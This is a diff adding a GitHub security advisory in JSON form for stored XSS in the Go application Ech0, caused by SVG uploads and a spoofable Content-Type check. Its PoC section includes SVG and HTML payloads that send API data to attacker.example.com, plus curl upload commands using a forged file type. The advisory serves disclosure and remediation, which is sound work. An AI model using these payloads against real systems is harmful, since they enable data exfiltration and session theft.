@@ -1,0 +1,46 @@
+{
+  "id": "GHSA-69hx-63pv-f8f4",
+  "modified": "2026-04-10T20:03:48.784287Z",
+  "published": "2026-04-10T19:50:01Z",
+  "summary": "Ech0 has Stored XSS via SVG Upload and Content-Type Validation Bypass in File Upload",
+  "details": "## Summary\n\nThe file upload endpoint validates Content-Type using only the client-supplied multipart header, with no server-side content inspection or file extension validation. Combined with an unauthenticated static file server that determines Content-Type from file extension, this allows an admin to upload HTML/SVG files containing JavaScript that execute in the application's origin when visited by any user. Additionally, `image/svg+xml` is in the default allowed types, enabling stored XSS via SVG without any Content-Type spoofing.\n\n## Details\n\nThe upload handler at `internal/service/file/file.go:85-87` validates file type using only the multipart `Content-Type` header:\n\n```go\ncontentType := file.Header.Get(\"Content-Type\") // client-controlled\nif !isAllowedType(contentType, config.Config().Upload.AllowedTypes) {\n    return commonModel.FileDto{}, errors.New(commonModel.FILE_TYPE_NOT_ALLOWED)\n}\n```\n\n`isAllowedType` at `file.go:836-843` performs exact string matching — no magic byte detection, no extension validation:\n\n```go\nfunc isAllowedType(contentType string, allowedTypes []string) bool {\n    for _, allowed := range allowedTypes {\n        if contentType == allowed {\n            return true\n        }\n    }\n    return false\n}\n```\n\nThe original file extension is preserved in the storage key by `RandomKeyGenerator` at `internal/storage/keygen.go:41`:\n\n```go\next := strings.ToLower(filepath.Ext(strings.TrimSpace(originalFilename)))\n```\n\nAll locally stored files are served publicly without authentication at `internal/router/modules.go:51`:\n\n```go\nctx.Engine.Static(\"api/files\", root)\n```\n\nThis `gin.Static` call is registered directly on the engine, outside any authentication middleware group. Go's `http.ServeFile` (used internally by `gin.Static`) determines the response `Content-Type` using `mime.TypeByExtension`, so `.html` files are served as `text/html` and `.svg` files as `image/svg+xml`.\n\nNo `X-Content-Type-Options: nosniff` or `Content-Security-Policy` headers are set (verified in `internal/router/middleware.go`).\n\n**Variant 1 — SVG XSS (no spoofing needed):** `image/svg+xml` is in the default `AllowedTypes` at `internal/config/config.go:241`. SVG files can contain `\u003cscript\u003e` tags and event handlers. The VireFS schema routes `.svg` to `images/` (`internal/storage/schema.go:10`). Uploaded SVGs are publicly accessible at `/api/files/images/\u003ckey\u003e.svg` and JavaScript within them executes in the application's origin.\n\n**Variant 2 — Content-Type spoofing:** Upload an `.html` file with a forged multipart `Content-Type: image/jpeg`. The allowlist check passes (image/jpeg is allowed). The `.html` extension is preserved. The VireFS schema routes unknown extensions to `files/` (`schema.go:14`). The file is served at `/api/files/files/\u003ckey\u003e.html` as `text/html`.\n\n## PoC\n\n**Variant 1 — SVG XSS (simplest, default config):**\n\n```bash\n# 1. Create SVG with embedded JavaScript\ncat \u003e evil.svg \u003c\u003c 'SVGEOF'\n\u003csvg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 100 100\"\u003e\n  \u003cscript\u003e\n    // Steal cookies and redirect to attacker\n    fetch('/api/echo/page')\n      .then(r =\u003e r.json())\n      .then(d =\u003e {\n        new Image().src = 'https://attacker.example.com/collect?data=' + btoa(JSON.stringify(d));\n      });\n  \u003c/script\u003e\n  \u003ccircle cx=\"50\" cy=\"50\" r=\"40\" fill=\"red\"/\u003e\n\u003c/svg\u003e\nSVGEOF\n\n# 2. Upload as admin (image/svg+xml is default-allowed, no spoofing needed)\ncurl -X POST http://target:1024/api/files/upload \\\n  -H 'Authorization: Bearer \u003cadmin-jwt\u003e' \\\n  -F 'file=@evil.svg;type=image/svg+xml' \\\n  -F 'category=image' \\\n  -F 'storage_type=local'\n\n# Response includes the storage key, e.g.: images/\u003cuid\u003e_\u003cts\u003e_\u003crand\u003e.svg\n# 3. Access without authentication — JavaScript executes in application origin:\n# GET http://target:1024/api/files/images/\u003cuid\u003e_\u003cts\u003e_\u003crand\u003e.svg\n```\n\n**Variant 2 — Content-Type bypass with HTML:**\n\n```bash\n# 1. Create HTML with JavaScript\ncat \u003e evil.html \u003c\u003c 'HTMLEOF'\n\u003chtml\u003e\u003cbody\u003e\n\u003cscript\u003e\n  document.write('\u003ch1\u003eXSS in ' + document.domain + '\u003c/h1\u003e');\n  // Exfiltrate data from same-origin API\n  fetch('/api/echo/page').then(r=\u003er.json()).then(d=\u003e{\n    new Image().src='https://attacker.example.com/?d='+btoa(JSON.stringify(d));\n  });\n\u003c/script\u003e\n\u003c/body\u003e\u003c/html\u003e\nHTMLEOF\n\n# 2. Upload with spoofed Content-Type\ncurl -X POST http://target:1024/api/files/upload \\\n  -H 'Authorization: Bearer \u003cadmin-jwt\u003e' \\\n  -F 'file=@evil.html;type=image/jpeg' \\\n  -F 'category=image' \\\n  -F 'storage_type=local'\n\n# 3. Access without authentication — renders as text/html:\n# GET http://target:1024/api/files/files/\u003cuid\u003e_\u003cts\u003e_\u003crand\u003e.html\n```\n\n## Impact\n\n- **Stored XSS in the application origin**: JavaScript executes in the context of the Ech0 application domain when any user visits the file URL directly.\n- **Session hijacking**: Attacker script can access same-origin cookies and API endpoints, enabling theft of admin session tokens.\n- **Persistent backdoor**: The malicious file remains on the unauthenticated static server even after the compromised admin account is secured or its credentials are rotated.\n- **Data exfiltration**: JavaScript running in the application origin can call internal API endpoints (e.g., `/api/echo/page`) and exfiltrate application data.\n- **Social engineering vector**: An admin (or attacker with admin credentials) plants the file; any user tricked into clicking the link is compromised.\n\nThe admin-required upload limits initial access, but the persistent nature of the stored XSS and the unauthenticated static serving create a meaningful attack surface, particularly in multi-admin deployments or after admin account compromise.\n\n## Recommended Fix\n\n**1. Validate Content-Type server-side using magic bytes** (`internal/service/file/file.go`):\n\n```go\nimport \"net/http\"\n\n// Replace client-controlled Content-Type with server-detected type\nfunc detectContentType(file multipart.File) (string, error) {\n    buf := make([]byte, 512)\n    n, err := file.Read(buf)\n    if err != nil \u0026\u0026 err != io.EOF {\n        return \"\", err\n    }\n    if _, err := file.Seek(0, io.SeekStart); err != nil {\n        return \"\", err\n    }\n    return http.DetectContentType(buf[:n]), nil\n}\n```\n\n**2. Remove `image/svg+xml` from default AllowedTypes** or sanitize SVGs to strip `\u003cscript\u003e` tags and event handlers before storage.\n\n**3. Add security headers** in `internal/router/middleware.go`:\n\n```go\nfunc SecurityHeaders() gin.HandlerFunc {\n    return func(c *gin.Context) {\n        c.Header(\"X-Content-Type-Options\", \"nosniff\")\n        c.Header(\"Content-Security-Policy\", \"default-src 'self'; script-src 'self'\")\n        c.Next()\n    }\n}\n```\n\n**4. Serve uploaded files with `Content-Disposition: attachment`** or from a separate origin/subdomain to isolate them from the application's cookie scope.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/lin-snow/ech0",
+        "purl": "pkg:golang/github.com/lin-snow/ech0"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "4.4.3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-69hx-63pv-f8f4/GHSA-69hx-63pv-f8f4.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/lin-snow/Ech0/security/advisories/GHSA-69hx-63pv-f8f4"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/lin-snow/Ech0"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/lin-snow/Ech0/releases/tag/v4.4.3"
+    }
+  ]
+}
